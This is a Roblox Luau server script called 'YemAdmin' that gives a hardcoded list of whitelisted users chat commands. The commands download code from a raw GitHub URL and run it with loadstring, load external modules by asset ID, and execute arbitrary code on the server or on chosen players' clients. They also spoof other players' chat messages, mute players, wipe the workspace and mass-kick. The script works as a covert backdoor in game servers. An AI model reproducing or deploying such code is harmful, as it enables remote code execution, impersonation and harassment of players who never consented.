--!strict
--!optimize 2
--!native
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")

local function NewGui(labels: {}): ScreenGui
	local cmdGui = Instance.new("ScreenGui")
	cmdGui.Name = "CMDSGUI"

	local mainButton = Instance.new("TextButton", cmdGui)
	mainButton.AutoButtonColor = false
	mainButton.Size = UDim2.new(0, 385, 0, 20)
	mainButton.BackgroundTransparency = 1
	mainButton.Text = ""
	mainButton.Position = UDim2.new(0.5, -200, 0.5, -200)
	Instance.new("UIDragDetector", mainButton)

	local mainFrame = Instance.new("Frame", mainButton)
	mainFrame.ZIndex = 7
	mainFrame.Style = Enum.FrameStyle.RobloxRound
	mainFrame.Size = UDim2.new(0, 400, 0, 400)

	local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
	scrollFrame.Size = UDim2.new(1, 0, 1, -20)
	scrollFrame.Position = UDim2.new(0, 0, 0, 20)
	scrollFrame.BackgroundTransparency = 1
	scrollFrame.ScrollBarThickness = 7
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

	local innerFrame = Instance.new("Frame", scrollFrame)
	innerFrame.Size = UDim2.new(1, 0, 0, 0)
	innerFrame.Position = UDim2.new(0, 0, 0, 0)
	innerFrame.Transparency = 1

	local baseLabel = Instance.new("TextLabel")
	baseLabel.ZIndex = 8
	baseLabel.TextXAlignment = Enum.TextXAlignment.Left
	baseLabel.TextYAlignment = Enum.TextYAlignment.Top
	baseLabel.TextSize = 18
	baseLabel.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	baseLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	baseLabel.BackgroundTransparency = 1
	baseLabel.RichText = true

	for i, v in ipairs(labels) do
		local newLabel = baseLabel:Clone()
		newLabel.Text = v
		newLabel.Position = UDim2.new(0, 0, 0, (i - 1) * 20)
		newLabel.Size = UDim2.new(1, 0, 0, 20)
		newLabel.Visible = true
		newLabel.Parent = innerFrame
	end

	innerFrame.Size = UDim2.new(1, 0, 0, #labels * 20)
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, innerFrame.Size.Y.Offset)

	local closeButton = Instance.new("TextButton", mainFrame)
	closeButton.TextSize = 18
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	closeButton.ZIndex = 10
	closeButton.Size = UDim2.new(0, 20, 0, 20)
	closeButton.Text = "X"
	closeButton.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeButton.Position = UDim2.new(1, -15, 0, -5)
	closeButton.MouseButton1Click:Connect(function(...)
		cmdGui:Destroy()
	end)

	return cmdGui
end
--NewGui({`I want the <font color="#FF7800">orange</font> candy.`, `I want the <font color="#0078FF">blue</font> candy.`}).Parent = game.Players.SnowClan_8342.PlayerGui

print'Started initialization of YemAdmin'
-- DEBUG CODE TO WIPE
if _G.yemdebug and _G.yem then
    _G.yem.eject()
    _G.yem = false -- wipe
end

-- TODO: commandbar

-- cuz some people kept mapping it and i decided to be unfunny
if not _G.yem then
    local yemEnv = {}
    local proxy = newproxy(true)
    local proxyMt = getmetatable(proxy)

    proxyMt.__index = function(table,key)
        return yemEnv[key]
    end 
    proxyMt.__newindex = function(table,key,value)
        yemEnv[key] = value
    end 
    _G.yem = proxy
end

local GetEnv = function()
    return _G.yem
end

if not GetEnv().config then
    GetEnv().config = {
        prefix = "&"
    }
end

if not GetEnv().tempbans then
    GetEnv().tempbans = {}
end

if not GetEnv().tempnicks then
    GetEnv().tempnicks = {}
end

if not GetEnv().tempblacklist then
    GetEnv().tempblacklist = {}
end

type AdminRank = {
    Rank: number,
    Colour: Color3,
}

-- NOTE: these shouldnt be modified while live
-- rank worth as a %percent%
local Ranks: {[string]: AdminRank} = {
    Developer = {
        Rank = 100,
        Colour = Color3.fromRGB(105, 47, 138)
    },
    Special = {
        Rank = 80,
        Colour = Color3.fromRGB(110, 57, 57)
    },
    Whitelist = {
        Rank = 50,
        Colour = Color3.fromHSV(0.692112, 0.539744, 0.7)
    }
}

local function RankToString(rank: number)
    for i, v in pairs(Ranks) do
        if rank == v.Rank then
            return i
        end
    end 
    return "User"
end

-- expose just 2 be nice qt3.14's
GetEnv().runLua = function(caller: Player, code: string, waitDelete: number?)
    if not ServerScriptService:FindFirstChild("goog") then
        local ticking = tick()
        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = ServerScriptService:FindFirstChild("goog")
    local p = caller

    if not goog then
        error("goog failed to be added, command can not continue")
    end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr:WaitForChild("Exec").Value = code

    if p.Character then
        scr.Parent = p.Character
    else
        scr.Parent = p:WaitForChild("PlayerGui")
    end

    scr.Enabled = true

    if waitDelete then
        task.wait(waitDelete)
        scr:Destroy()
    end
end

type WhitelistData = {
    rank: AdminRank,
    COMMENT: string? -- optional comments
}

if not GetEnv().tempwhitelist then
    GetEnv().tempwhitelist = {
        ["SnowClan_8342"] = {
            rank = Ranks.Developer,
            COMMENT = "Note that all a higher rank does is give me access to 'enr' (eject resets _G.yem) and 'shutdown' so please either do it by hand or dont touch this!"
        },

        -- people i know & trust (sometimes)
        ["qwdssssfsdrfasd"] = { rank = Ranks.Special },
        ["yx_doomspire"] = { rank = Ranks.Special },
        ["idonthacklol101ns"] = { rank = Ranks.Special },
        ["AIphaGunner"] = { rank = Ranks.Special },
        ["trashmoderatio1n"] = { rank = Ranks.Special },
        ["xXRblxGamerRblxXx"] = { rank = Ranks.Special },
        ["pawsornever"] = { rank = Ranks.Special },
        ["bob90368"] = { rank = Ranks.Special },
        ["s_tun"] = { rank = Ranks.Special },
        ["bbangtans"] = { rank = Ranks.Special },

        -- they've been nice and didnt abuse whitelist so i might aswell
        ["BionicGamer112203"] = { rank = Ranks.Whitelist },
    }
end

local tempwhitelist: {[string]: WhitelistData} = GetEnv().tempwhitelist

local GetRank = function(plyr: Player)
    return (tempwhitelist[plyr.Name] and tempwhitelist[plyr.Name].rank.Rank) or 0
end

if GetEnv().eject then
    GetEnv().eject()
end

local connections: {RBXScriptConnection} = {}
local isRunning = true
GetEnv().eject = function()
    isRunning = false
    for i,v in pairs(connections) do
        v:Disconnect()
    end
end

-- TODO: move to another luau file or smth
local Msg = function(caller: Player, msg: string, legacyMsg: boolean?)
    if legacyMsg then
        local msgInst = Instance.new("Message", caller.PlayerGui)
        msgInst.Text = msg
        task.wait(3)
        msgInst:Destroy()
        return
    end 

    -- TODO: a remote event in replicated storage specifically for this or smth so i dont dupe scripts
    GetEnv().runLua(caller, `game.StarterGui:SetCore("SendNotification", \{Title = "YemAdmin",Text = "{msg}",Duration = 5\})`, 1)
end

local ClearWorkspace = function()
    for _, object in pairs(workspace:GetChildren()) do
        if object == workspace.Terrain or object == workspace.Tabby then continue end
        if Players:GetPlayerFromCharacter(object) then continue end
        
        object:Destroy()
    end
end

local RemoveItem = function(tbl: {any}, item: any) 
    for i,v in ipairs(tbl) do
        if v == item then
            table.remove(tbl, i)
            --break
        end 
    end
    return tbl
end

type UserList = { [number]: string }
type UserArray = { string }
type KickList = { any }--idc

type Settings = {
    Legacy_ExcludedUsers: UserList,
    af: boolean,
    CensoredUsers: UserList,
    tempadmins: UserList,
    Legacychatadmins: UserArray,
    tempkicked: KickList,
    Filterlegacychat: boolean,
    p299: UserList,
    permadmins: UserList,
    specialperms: UserList,
    BindPlayerChatted: (plyr: Player)->RBXScriptSignal,

    -- just so the errors stfu in ide :)
    yemdebug: boolean?,
}
local _G = _G :: Settings

-- rewritten for multi-target
-- NOTE: sketchy i needa compact it and clean it a bit tbf
local getPlyr = function(caller: Player, name: string)
	local _name = string.lower(name)

    local operands = string.split(_name, ",") or _name
    assert(#operands > 0, "No operands given")

    local output: {Player} = {}

    for i,v in pairs(operands) do
        if v:lower() == "me" then
            table.insert(output, caller)
        elseif v:lower() == "all" then
            for _,plr in pairs(Players:GetPlayers()) do
                table.insert(output, plr)
            end
        elseif v:lower() == "others" or v:lower() == "other" then
            for _,plr in pairs(Players:GetPlayers()) do
                if plr ~= caller then
                    table.insert(output, plr)
                end
            end
        elseif v:lower() == "admins" or v:lower() == "admin" then
            for _,plr in pairs(Players:GetPlayers()) do
                if table.find(_G.tempadmins, plr.Name) then
                    table.insert(output, plr)
                end
            end
        elseif v:lower() == "nonadmins" or v:lower() == "nonadmin" then
            for _,plr in pairs(Players:GetPlayers()) do
                if not table.find(_G.tempadmins, plr.Name) then
                    table.insert(output, plr)
                end
            end
        else
            for _, player in ipairs(Players:GetPlayers()) do
            	if string.find(string.lower(player.Name), _name, 1, true) or string.find(string.lower(player.DisplayName), _name, 1, true) then
            		table.insert(output, player)
            	end
            end
        end
    end

	return output
end

-- TODO: wrap this in some kind of format library
function E(text: string)
	return text:gsub('[&<>"\']',{
		['&'] = '&amp;',
		['<'] = '&lt;',
		['>'] = '&gt;',
		['"'] = '&quot;',
		['\''] = '&apos;',
	})
end

-- unique roblox emojis
-- TODO: actual roblox emojis too or smth idk
function F(text: string)
	return text:gsub(':(%w+):',function(t)
        return ({
            verified = utf8.char(0xE000),
            premium = utf8.char(0xE001),
            robux = utf8.char(0xE002)
        })[t] or (":"..t..":") -- sketchy
    end)
end

function C(text: string, colour: Color3)
    return `<font color="#{colour:ToHex()}">{text}</font>`
end

local commands: {Command} = {}

type Command = {
    Name: string,
    Description: string,
    Arguments: string,
    MinimumRank: number,
    OnCalled: (... any)->()
}

print'initializing'
local AddCommand = function(minrank: number, name: string, desc: string, args: string, onCalled: (caller: Player, ... any)->())
	local tmpTbl: Command = {
		["Name"] = name,
		["Description"] = desc,
		["Arguments"] = args,
		["MinimumRank"] = minrank,
		["OnCalled"] = onCalled
	}
	table.insert(commands, tmpTbl)
end

local IssueCommand = function(caller: Player, command: string)
    local prefix = GetEnv().config.prefix
	if string.sub(command, 1, #prefix) == prefix then
		command = string.sub(command, #prefix + 1)
	end

    local plrRank = GetRank(caller)

	for i,cmd in ipairs(commands) do
		local commandSplit: {string} = string.split(command, " ")
        local cmdName = table.remove(commandSplit, 1)
        assert(cmdName ~= nil, `cmdName is for some reason nil (It cant be)`)

		if string.lower(cmdName) == cmd.Name then
            if plrRank < cmd.MinimumRank then
                Msg(caller, `You must be rank {RankToString(cmd.MinimumRank)}({cmd.MinimumRank}/100) or higher to use this command. You are {RankToString(plrRank)}({plrRank})`)
                return -- no permission
            end
			local s,r = pcall(function()
				cmd.OnCalled(caller, unpack(commandSplit))
			end)
			if s ~= true then
				Msg(caller, r)--was msg anyways
			end
            return
		end
	end

    Msg(caller, `'{command}' is not a valid command`)
end

local onPlayerChatted = function(plyr: Player, msg: string)
    if not isRunning then return end

    --if not tempwhitelist[plyr.Name] then
    --    return -- verify has a rank first
    --end

    local prefix = GetEnv().config.prefix
	if string.sub(msg, 1, #prefix) == prefix then
        IssueCommand(plyr, msg)
    end
end

local bindChatToPlyr = function(plyr: Player)
    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
        onPlayerChatted(plyr, msg)
    end)

    task.wait()
    local plrRank = GetRank(plyr)
    if plrRank > 0 then
        Msg(plyr, `Welcome back {plyr.Name} you are {RankToString(plrRank)}({plrRank})`)
    end
end

table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
    if GetEnv().tempbans[plyr.Name] then
        plyr:Kick(GetEnv().tempbans[plyr.Name])
        return
    end

    if plyr.Name:lower():sub(1, 4) == "wiwo" then
        plyr:Kick("IP banned for racism!")
    end

    bindChatToPlyr(plyr)
end))

table.insert(connections, workspace.ChildAdded:Connect(function(a0: Instance)
    local humanoid = a0:WaitForChild("Humanoid", 3) :: Humanoid
    if humanoid and GetEnv().tempnicks[humanoid.DisplayName] then 
        humanoid.DisplayName = GetEnv().tempnicks[humanoid.DisplayName]
    end 
end))

table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
    local removal = {}
    
    for i, v in pairs(_G.tempadmins) do
        if GetEnv().tempblacklist[v] then
            table.insert(removal, i)
        end
    end

    for _, index in ipairs(removal) do
        table.remove(_G.tempadmins, index)
    end
end))

local ss,rr = pcall(function(...)
for i,plyr in pairs(Players:GetPlayers()) do
    bindChatToPlyr(plyr)
end
end)
if not ss then warn (rr) end
print'chat hooks'

--cmds
AddCommand(0, "cmds", "Display a list of basic commands", "<>", function(caller: Player)
    -- TODO: minecraft bedrock server formatting codes inside of the "F" format function
    local output: {string} = {
        C("NOTE: Some of these commands use format", Color3.fromRGB(40, 110, 38)),
        C("experiments. (for example &nick)", Color3.fromRGB(40, 110, 38)),
        C("You may use these via ", Color3.fromRGB(40, 110, 38)),
        C(":verified: :premium:", Color3.fromRGB(88, 34, 101)) .. C(" or ", Color3.fromRGB(40, 110, 38)) .. C(":robux:", Color3.fromRGB(88, 34, 101)), ""
    }

    local plrRank = GetRank(caller)

    local prefix = GetEnv().config.prefix
    for i,cmd in ipairs(commands) do
		local cmdName = cmd["Name"]
        local cmdDescr = cmd["Description"]
        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#919191"))

        if plrRank < cmd.MinimumRank then
            cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#3b1212"))

            table.insert(output, `{C(prefix, Color3.fromHex("#491717"))}{C(cmdName, Color3.fromHex("#310000"))} {cmdArgs} {C(`- {cmdDescr}`, Color3.fromHex("#310000"))}`)
            continue
        end

        table.insert(output, `{C(prefix, Color3.fromHex("#738e99"))}{cmdName} {cmdArgs} - {cmdDescr}`)
	end

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(0, "tpall", "Move all players to this server", "<>", function(caller: Player)
    caller:Kick("dumbass actually tried")
end)

AddCommand(Ranks.Developer.Rank, "enr", "Enter debug mode", "<boolean>", function(caller: Player, value: string)
    _G.yemdebug = (value:lower() == "true")
end)

AddCommand(Ranks.Developer.Rank, "setscore", "Set players score (FAKE)", "<...>", function(caller: Player, plyr1: string, amount: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local _amount = tonumber(amount)
    --assert(_amount and (amount < 1000000 and amount > -1000000), `Invalid amount`)
    for i,v: any in pairs(targets) do -- cast to any to silence errors
        v.leaderstats.Score.Value = _amount
        v.SScore.Value = _amount
    end
end)

AddCommand(Ranks.Special.Rank, "sentrius", "A nice admin :)", "<>", function(caller: Player)
    local code = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/dmxxxx29/Roblox-/refs/heads/main/sentrius.lua")
    getfenv().loadstring(code)()
end)

AddCommand(Ranks.Special.Rank, "shutdown", "Emergency cleanup :)", "<...>", function(caller: Player, ...)
    local reason = table.concat({...}, " ")

    Players.PlayerAdded:Connect(function(a0: Player)
        a0:Kick(reason)
    end)

    for i,v in pairs(Players:GetPlayers()) do
        v:Kick(reason)
    end
end)

AddCommand(Ranks.Special.Rank, "dex", "Serverside dex", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank < Ranks.Special.Rank then continue end

        -- cant give dex to people without serverside commands
        task.spawn(function() getfenv().require(14572394952)(target.Name) end)
    end
end)

AddCommand(Ranks.Special.Rank, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
    local code = table.concat({...}, " ")
    assert(code, "No code")
    
    local chunk, loadErr = loadstring(code, "Cattails")
    assert(chunk, `Script failed to execute; {loadErr}`)
    chunk()
end)

AddCommand(Ranks.Special.Rank, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local code = table.concat({...}, " ")
    assert(code, "No code")

    for i,target in pairs(targets) do
        task.spawn(function()
            GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
        end)
    end
end)

AddCommand(Ranks.Special.Rank, "whitelist", "Give someone access", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        if not tempwhitelist[target.Name] then -- glad no one realized u could do this bruh
            tempwhitelist[target.Name] = { rank = Ranks.Whitelist }
        end
    end
end)

AddCommand(Ranks.Whitelist.Rank, "bans", "Display a list of banned players", "<>", function(caller: Player)
    local output: {string} = {}

    for i,plr in pairs(GetEnv().tempbans) do
        table.insert(output, `{C(i, Color3.fromHex("#997373"))} - reason: im to lazy to find it thanks`)
	end

    if #output == 0 then
        table.insert(output, C("Oopsie daisy! theres no bans here silly.", Color3.fromHex("#6ab483")))
    end 

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(Ranks.Whitelist.Rank, "admins", "Display a list of admins", "<>", function(caller: Player)
    local output: {string} = {}

    local noDupe = {}
    for i,plr in pairs(_G.tempadmins) do
        if table.find(noDupe, plr) then continue end
        if not Players:FindFirstChild(plr) then continue end

        table.insert(noDupe, plr)

        local endStr: {string} = {}

        if table.find(_G.permadmins, plr) then -- is perm
            table.insert(endStr, C("Perm", Color3.fromHSV(0.398148, 0.546154, 0.4)))
        end
        
        if table.find(_G.p299, plr) then -- is persons/p299
            table.insert(endStr, C("P299", Color3.fromHSV(0.136132, 0.539744, 0.4)))
        end
        
        local plrData = tempwhitelist[plr]
        if plrData then -- is whitelist/whatrank
            table.insert(endStr, C(RankToString(plrData.rank.Rank), plrData.rank.Colour))
        end

        table.insert(output, `{C(plr, Color3.fromHex("#c8c8c8"))} ({table.concat(endStr, ", ")})`)
	end

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(Ranks.Whitelist.Rank, "clr", "Clear everything from workspace", "<>", ClearWorkspace)

AddCommand(Ranks.Whitelist.Rank, "kick", "Kick a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank >= Ranks.Special.Rank then continue end

        local reason = table.concat({...}, " ")
        target:Kick(reason)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank >= Ranks.Special.Rank then continue end

        local reason = `\n\n[YemAdmin]\nYou have been banned for:\n{table.concat({...}, " ")}`
        target:Kick(reason)
        GetEnv().tempbans[target.Name] = reason
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unban", "Unban a player", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(GetEnv().tempbans) do
        if string.find(string.lower(i), plyr1, 1, true) then
            GetEnv().tempbans[i] = nil
            return
        end
    end
    error("User not found")
end)

AddCommand(Ranks.Whitelist.Rank, "blacklist", "Erase a players admin", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        GetEnv().tempblacklist[target.Name] = {}
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unblacklist", "Unblacklists a player", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(GetEnv().tempblacklist) do
        if string.find(string.lower(i), plyr1, 1, true) then
            GetEnv().tempblacklist[i] = nil
            return
        end
    end
    error("User not found in blacklist")
end)

AddCommand(Ranks.Whitelist.Rank, "perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        table.insert(_G.permadmins, target.Name)
        table.insert(_G.p299, target.Name)
        table.insert(_G.tempadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unperm", "Erase someones perm", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        _G.permadmins = RemoveItem(_G.permadmins, target.Name)
        _G.p299 = RemoveItem(_G.p299, target.Name)
        _G.tempadmins = RemoveItem(_G.tempadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "censor", "Restore someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        _G.Legacychatadmins = RemoveItem(_G.Legacychatadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "uncensor", "Remove someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        table.insert(_G.Legacychatadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "mute", "Disable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        task.spawn(function()
            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unmute", "Enable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        task.spawn(function()
            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "gearban", "Disable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        task.spawn(function()
            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "ungearban", "Enable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        task.spawn(function()
            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)`)
        end)
    end
end)

-- TODO: legacy chat nicknames
AddCommand(Ranks.Whitelist.Rank, "nick", "Nick a player " .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local newNick = F(table.concat({...}, " "))
    assert(newNick and #newNick > 1, "Nickname length invalid (2 or more charcaters required)")

    for i,target in pairs(targets) do
        --local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        --if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
            local humanoid = target.Character and target.Character:WaitForChild("Humanoid", 1) :: Humanoid
            assert(humanoid, "Invalid humanoid")

            humanoid.DisplayName = newNick
            GetEnv().tempnicks[target.DisplayName] = newNick
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unnick", "Unnick a player", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        --local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        --if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
            local humanoid = target.Character and target.Character:WaitForChild("Humanoid", 1) :: Humanoid
            assert(humanoid, "Invalid humanoid")

            humanoid.DisplayName = target.DisplayName
            GetEnv().tempnicks[target.DisplayName] = nil
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "speak", "Speak as player" .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local spoofText = F(table.concat({...}, " "))
    assert(spoofText and #spoofText > 1, "Text length invalid (2 or more charcaters required)")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
            GetEnv().runLua(target, `game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{spoofText}", "All")`)
        end)
    end
end)

print'commands initialized'
